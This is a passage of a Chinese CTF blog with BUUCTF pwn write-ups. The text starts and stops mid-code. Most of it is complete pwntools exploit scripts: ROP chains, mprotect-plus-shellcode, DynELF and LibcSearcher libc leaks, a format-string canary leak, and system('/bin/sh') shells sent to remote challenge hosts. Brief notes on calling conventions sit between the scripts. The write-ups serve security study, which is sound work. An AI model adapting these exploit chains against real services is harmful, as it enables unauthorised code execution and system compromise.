这道题本地和远程两种解法，真的干。。。</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(proc_name)</span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">    backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">    printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 这边不用覆盖ebp,在于get_flag并没有push ebp</span></span><br><span class="line">    payload += p32(backdoor_addr) + p32(printf_addr)</span><br><span class="line">    payload += p32(str_flag_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28308</span>)</span><br><span class="line">    mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pop3_edi_esi_ebx_ret = <span class="number">0x0806fcc8</span></span><br><span class="line">    mem_addr = <span class="number">0x080EB000</span> <span class="comment">#.got.plt 的起始地址</span></span><br><span class="line">    mem_size = <span class="number">0x1000</span></span><br><span class="line">    mem_type = <span class="number">0x7</span> <span class="comment"># 可执行权限</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p32(mprotect_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)</span><br><span class="line">    payload += p32(read_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(mem_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(mem_addr)    <span class="comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="comment"># read写入shellcode</span></span><br><span class="line">    payload = asm(shellcraft.sh())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-32位，64位栈溢出对比"><a href="#五-32位，64位栈溢出对比" class="headerlink" title="五. 32位，64位栈溢出对比"></a>五. 32位，64位栈溢出对比</h2><p>32位的函数在调用栈的时候是：</p><pre><code>   调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1</code></pre><p>由于在函数调用前通过push指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp。</p><p><img src="https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png" alt="image-20211014161530117"></p><p><img src="https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png" alt="image-20211014161545492"></p><p>64位的函数在调用栈的时候是：</p><pre><code>   前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。   参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址</code></pre><p><img src="https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png" alt="image-20211014161246387"></p><h2 id="六-覆盖相关变量"><a href="#六-覆盖相关变量" class="headerlink" title="六. 覆盖相关变量"></a>六. 覆盖相关变量</h2><ol><li><p>ebp</p></li><li><p>ret_addr</p></li><li><p>虚函数指针</p><p>​    子类对父类的继承<br>​    能够对函数进行重写<br>​    由虚函数表来进行操作</p></li><li><p>SEH链</p><p>​    SEH结构 结构 在栈中存在的 地方 ，在 在ret_addr和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对SEH链的攻击</p></li><li><p>Hook中的变量</p><p>利用方法介绍<br> 有些系统函数有预先定义好的钩子<br> 修改钩子链表中存储的子程序指针<br>影响钩子运行</p></li><li><p>fgets的用法的时候，发现它能够避免造成溢出</p></li><li><p>程序自带的system函数地址</p></li><li><p>timeout: the monitored command dumped core解决</p><p>1)在payload后面加几个ret地址，或者加一个假的0xdeadbeef</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>, pop_di, bin_sh_addr, system, <span class="number">0xdeadbeef</span>])</span><br></pre></td></tr></table></figure><p>2)直接用系统函数的地址</p><h2 id="七-BUUCTF-例题"><a href="#七-BUUCTF-例题" class="headerlink" title="七. BUUCTF 例题"></a>七. BUUCTF 例题</h2><h3 id="1-JarvisOJ-level4"><a href="#1-JarvisOJ-level4" class="headerlink" title="1. JarvisOJ level4"></a>1. JarvisOJ level4</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>参考文章：<a href="https://www.anquanke.com/post/id/85129">借助DynELF实现无libc的漏洞利用小结</a></p><p>pwntools中DynELF函数使用(针对未给出libc文件)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload=pad+p32(writeplt)+ret1+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    leak_sysaddr=io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;))   这里是测试用，可省略。</span></span><br><span class="line">    <span class="keyword">return</span> leak_sysaddr</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;对应文件&quot;</span>))</span><br><span class="line">sysaddr=d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pad为填充，ret1为有效的返回地址</p><h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png" alt="image-20211116101807208"></p><p>开了NX保护（堆栈不可执行）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png" alt="image-20211116104613084"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png" alt="image-20211116104635203"></p><p>利用DynELF泄露system地址，通过read函数写入/bin/sh到bss段</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn=process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">pad=<span class="number">0x88</span></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vul_addr=<span class="number">0x804844b</span></span><br><span class="line">bss_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(vul_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data=conn.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data </span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(read_plt)+p32(vul_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload3=<span class="string">&quot;a&quot;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常规解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25934</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h4><p>64位ret2libc（no canary found)</p><p>checksec </p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png" alt="image-20211117093331127"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png" alt="image-20211117093259888"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png" alt="image-20211117093412861"></p><ol><li><p>泄露libc</p><p>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br>我们这边要利用write函数去泄露libc版本<br>write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>利用ROPgadget寻找rdi,rsi寄存器地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png" alt="image-20211117094445688"></p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26919</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.19.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)  <span class="comment">#rdi寄存器设置write函数的第一个参数为‘1’</span></span><br><span class="line">payload+=p64(rsi_r15)+p64(write_got)+p64(<span class="number">8</span>) <span class="comment">#rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8</span></span><br><span class="line">payload+=p64(write_plt) <span class="comment">#去调用write函数</span></span><br><span class="line">payload+=p64(main)   <span class="comment">#控制程序流，回到main函数，继续控制</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#write_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png" alt="image-20211117103202380"></p><p>程序结构</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png" alt="image-20211117103343882"></p><p>init（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png" alt="image-20211117103404402"></p><p>gift（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png" alt="image-20211117103423993"></p><p>vuln（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png" alt="image-20211117103501439"></p><p>在gift函数处存在格式化字符串漏洞，可以用来泄露libc</p><p>在vuln函数处存在buf溢出漏洞，绕过canary就可以利用ret2libc来获取shell</p><ol><li><p>泄露canary值</p><p>输入<code>%n$p</code>来找偏移，n为偏移量，<code>$p</code>定位到偏移处，<code>%p</code>以16进制输出</p></li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png" alt="image-20211117104417028"></p><ol start="2"><li><p>找到一个nop指令下断点查看栈的情况</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png" alt="image-20211117105719634"></p></li><li><p>可以看到6161下面有一串16进制数，这个就是canary值，利用%7$p就可以泄露它的值，而且看到它在栈的位置是0x18</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png" alt="image-20211117105745656"></p><p>泄露canary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>另外pwngbd提供了一种方便的函数fmtarg，使用格式为fmtarg addr。在进入printf函数时断下，调用fmtarg后可以自动计算格式化参数与addr的偏移。fmtarg在计算index时将RDI也算了进去，后面会自动减一作为%$p的参数：</p><p><img src="https://img-blog.csdnimg.cn/20200826223512973.png#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li>利用puts函数泄露libc，puts函数只有一个参数，64位传参，利用rdi寄存器即可，ROPgadget找rdi</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png" alt="image-20211117110117854"></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25998</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(canary)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400993</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vul_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)</span><br><span class="line">payload +=p64(puts_plt)+p64(vul_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><p>printf泄露真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr=<span class="number">0x400770</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400730 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400732 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005a0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400733 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400731 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004d1 : ret</span></span><br><span class="line"><span class="string">0x0000000000400532 : ret 0x200a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(format_addr)+p64(<span class="number">0x400731</span>)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(binsh_addr)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 